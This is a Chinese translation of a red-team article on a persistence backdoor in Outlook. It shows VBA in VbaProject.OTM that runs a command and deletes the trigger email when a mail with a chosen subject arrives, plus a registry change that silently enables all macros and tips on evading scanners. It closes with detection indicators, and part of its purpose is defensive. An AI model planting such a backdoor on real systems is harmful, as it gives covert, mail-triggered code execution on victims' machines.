> 原文链接: https://www.anquanke.com//post/id/223632 


# 利用Outlook创建基于邮件的持久化后门


                                阅读量   
                                **187248**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Dominic Chell，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/﻿](https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01fc5844ec4da66a34.png)](https://p0.ssl.qhimg.com/t01fc5844ec4da66a34.png)



## 简介

我们一直对研究未被广泛记录并可能在蓝队的雷达下优雅飞行的新技术感兴趣。去年，我们发布了一个由[三部分组成](https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/)的有关持久化的系列文章，今天，在本文中，我们将重新讨论这个主题，概述我们最近在Outlook中探索的持久化技术，到目前为止，许多攻防对抗的“蓝队”都没有注意到这种技术。

基于Outlook持久化的主题在过去已经涉及了多次，包括[Dave Hartley](https://labs.f-secure.com/archive/malicous-outlook-rules/)和[Nick Landers](https://silentbreaksecurity.com/malicious-outlook-rules/)的先前工作，他们详细介绍了如何使用Outlook的规则来持久化。

但是，在本文中，我们将重点介绍使用Outlook的`VbsProject.OTM`文件来达到相似结果的另一种实现。 尽管此技术尚未得到很好的普及（至少据我们所知），但[Cobalt Kitty](//www.cybereason.com/hubfs/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty-Part1.pdf)已将其用作命令和控制通道。



## 分析

与大多数Microsoft Office产品套件一样，Outlook可以启用`developer`选项卡，并通过VB编辑创建基于VBA的宏。打开编辑器并创建一个简单的宏，你会发现一个名为“ThisOutlookSession”的Outlook特定模块:

[![](https://p1.ssl.qhimg.com/t01df1e47cdeb369f4f.png)](https://p1.ssl.qhimg.com/t01df1e47cdeb369f4f.png)

保存此宏将导致会在`％APPDATA％\Roaming\Microsoft\Outlook`目录中创建`VbaProject.OTM`文件：

[![](https://p1.ssl.qhimg.com/t01d3e7558e48b0e72d.png)](https://p1.ssl.qhimg.com/t01d3e7558e48b0e72d.png)

但是，尝试以默认配置执行宏将失败，默认配置为“数字签名宏的通知，所有其他宏均已禁用”。

但是，我们可以通过使用以下值创建安全性注册表项来修改此配置：

[![](https://p2.ssl.qhimg.com/t01d9b91ccbe1041344.png)](https://p2.ssl.qhimg.com/t01d9b91ccbe1041344.png)

Level值定义了宏安全配置，其值如下:

```
4 = Disable all macros without notification
3 = Notifications for digitally signed macros, all other macros disabled
2 = Notifications for all macros
1 = Enable all Macros
```

要允许宏以隐蔽方式运行而不会通知用户，你可能需要设置“Level”值以在操作期间启用所有宏。

通过检查`VbaProject.OTM`文件，我们发现它是标准的Microsoft复合文档文件（CDF）：

```
dmc@deathstar ~  ✗ file ~/VbaProject.OTM
VbaProject.OTM: Composite Document File V2 Document, Cannot read section info
```

使用`oledump.py`进行的进一步分析显示了其中包含宏代码的OLE流：

```
dmc@deathstar ~  ✗ python oledump.py ~/VbaProject.OTM
  1:        43 'OutlookProjectData'
  2:       388 'OutlookVbaData/PROJECT'
  3:        59 'OutlookVbaData/PROJECTwm'
  4: M    6156 'OutlookVbaData/VBA/ThisOutlookSession'
  5:      2663 'OutlookVbaData/VBA/_VBA_PROJECT'
  6:       497 'OutlookVbaData/VBA/dir'
```

至此，我们已经知道`VbaProject.OTM`是启用了OLE宏的标准文档，因此创建，混淆，清除和重载这些文件的传统工具和技术仍然适用。当你在将其拖放到磁盘上时，你可能需要确保其在对抗静态扫描时能够安全。

让我们来探讨一下我们如何才能将这种持久性武器化。



## 武器化

为了使VBA代码执行变得有意义，需要将代码作为事件的结果执行。`ThisOutlookSession`模块允许你订阅Outlook中的许多不同事件，这提供了获得代码执行的各种不同机会。

对于持久性的用例，有趣事件的潜在选项可能包括由用户驱动的事件，如Outlook打开，或者由操作人员自行决定的事件，如特定邮件送达。对于这个武器化的例子，我们将着重于后者，并说明如何根据带有特定主题的邮件执行任意的VBA。

为了确认何时收到新邮件，我们可以通过在Outlook启动时首先订阅默认收件箱的事件来实现，可以使用以下方法：首先在默认收件箱文件夹(olInboxItems)中设置变量，同时在其中注册事件：

```
Option Explicit
Private WithEvents olInboxItems As Items
Private Sub Application_Startup()
    Set olInboxItems = Session.GetDefaultFolder(olFolderInbox).Items
End Sub
```

然后，使用对用户收件箱的引用，我们可以使用“[ItemAdd](https://docs.microsoft.com/en-us/office/vba/api/outlook.items.itemadd)”回调函数在收到新邮件时接收事件：

```
Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
End Sub
```

具体来说，我们只对传入的电子邮件感兴趣，因此我们需要优化回调，使其仅可以通过新的邮件来触发。我们可以通过验证项目以确保在其类型为“[MailItem](https://docs.microsoft.com/en-us/office/vba/api/outlook.mailitem)”时来做到这一点：

```
Private Sub olInboxItems_ItemAdd(ByVal Item As Object)  
    If TypeOf Item Is MailItem Then
        MsgBox "You have mail"
    End If
End Sub
```

当然，我们不想对每一封邮件都执行，所以我们可以使用任何我们喜欢的标准来过滤收到的邮件，电子邮件地址，主题，正文内容等等。让我们扩展代码，以便在带有特定主题(MailItem.Subject)的邮件时执行指定代码，然后在使用`MailItem`完成代码执行后删除电子邮件。删除方法:

```
Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
    On Error Resume Next
    Dim olMailItem As MailItem
    If TypeOf Item Is MailItem Then
       If InStr(olMailItem.Subject, "MDSec") &gt; 0 Then
            MsgBox "Hack The Planet"
            olMailItem.Delete
        End If
    End If
    Set Item = Nothing
    Set olMailItem = Nothing
End Sub
```

然后我们来尝试弹出一个计算器：

```
Option Explicit

Private WithEvents olInboxItems As Items

Private Sub Application_Startup()
    Set olInboxItems = Session.GetDefaultFolder(olFolderInbox).Items
End Sub

Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
    On Error Resume Next
    Dim olMailItem As MailItem
    If TypeOf Item Is MailItem Then
       If InStr(olMailItem.Subject, "MDSec") &gt; 0 Then
            MsgBox "Hack The Planet"
            Shell "calc.exe"
            olMailItem.Delete
        End If
    End If
    Set Item = Nothing
    Set olMailItem = Nothing
End Sub
```

[![](https://p2.ssl.qhimg.com/t01d6a38dba98794d0c.gif)](https://p2.ssl.qhimg.com/t01d6a38dba98794d0c.gif)

弹出calc很酷，但是还可以更好地利用武器生成一个信标，这部分留给读者练习：

[![](https://p1.ssl.qhimg.com/t01d9f7a4a1a233a904.gif)](https://p1.ssl.qhimg.com/t01d9f7a4a1a233a904.gif)



## 对此技术的检测

从终端的角度检测这种技术可以通过两个关键指标来实现:

> 1.监视`％APPDATA％\Roaming\Microsoft\Outlook\VbaProject.OTM`文件的创建/修改事件（Sysmon事件ID 11）。
2.监视`HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security`密钥和值级别的创建/更改事件（Sysmon事件ID 12）。
